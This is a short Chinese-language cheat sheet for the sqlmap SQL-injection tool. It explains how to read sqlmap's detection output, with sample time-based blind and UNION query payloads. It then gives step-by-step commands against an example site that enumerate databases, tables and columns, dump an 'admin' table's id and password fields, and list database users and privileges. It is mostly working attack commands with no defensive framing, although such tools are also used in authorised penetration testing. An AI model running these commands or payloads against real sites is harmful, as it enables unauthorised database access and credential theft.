测试注入点(一般): sqlmap -u "要进行注入测试的URL"
如果出现 

python sqlmap.py -u "URL"
```
Parameter: id (GET)
    Type: time-based blind
```

等信息, 说明注入点可以注入
包含的信息有

// 参数: 参数名(请求方法)
            
Parameter: id (GET)

    // 注入类型: 例如这里是 时间盲注
    `Type: time-based blind`
	// 一些信息
    `Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)`
	// payload, playload就是可以验证漏洞的一个语句
    `Payload: id=1' AND (SELECT 1117 FROM (SELECT(SLEEP(5)))zEna) AND 'vTMB'='vTMB`
	
	// 类型(这里是第二种类型，有的注入点可能只有一个注入类型，有的很可以有多个)，这里的类型是 联合查询注入
    `Type: UNION query`
    `Title: Generic UNION query (NULL) - 2 columns`
    `Payload: id=1' UNION ALL SELECT` `NULL,CONCAT(0x71626b7671,0x42476a4d566b596a6a46575656467773664e64756f575743645a48495a6e797a674b705478527865,0x716b767671)-- OtOY---`
    
检查注入点：
sqlmap -u http://aa.com/star_photo.php?artist_id＝11

爆所有数据库信息：
`sqlmap -u http://aa.com/star_photo.php?artist_id＝11 --dbs`

爆当前数据库信息：
`sqlmap -u http://aa.com/star_photo.php?artist_id＝11 --current-db`

指定库名列出所有表:
`sqlmap -u http://aa.com/star_photo.php?artist_id＝11 -D vhost48330 --tables`

'vhost48330' 为指定数据库名称

指定库名表名列出所有字段
`sqlmap -u http://aa.com/star_photo.php?artist_id＝11 -D vhost48330 -T admin --columns`
'admin' 为指定表名称

指定库名表名字段dump出指定字段
`sqlmap -u http://aa.com/star_photo.php?artist_id＝11 -D vhost48330 -T admin -C ac，id，password --dump`
'ac,id,password' 为指定字段名称

查看当前数据库所连接的用户
`sqlmap -u "url" --current-user`

查看所有用户的权限
`sqlmap -u "url" --privileges`